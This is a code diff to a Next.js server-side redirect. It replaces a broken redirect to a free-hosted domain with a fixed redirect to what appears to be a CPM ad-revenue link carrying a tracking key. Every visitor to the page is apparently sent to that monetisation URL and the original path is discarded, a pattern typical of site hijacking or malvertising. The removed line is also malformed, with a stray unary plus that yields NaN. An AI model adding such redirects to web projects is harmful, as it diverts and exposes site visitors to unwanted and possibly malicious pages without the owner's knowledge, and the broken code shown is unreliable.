@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`http://sunnythakur.rf.gd/` +  + encodeURI(path as string)
+					`https://www.highwaycpmrevenue.com/x0tgrkhaxy?key=06e056aeaca1482b8697b274dea0b206/`
 				}`,
 			},
 		};
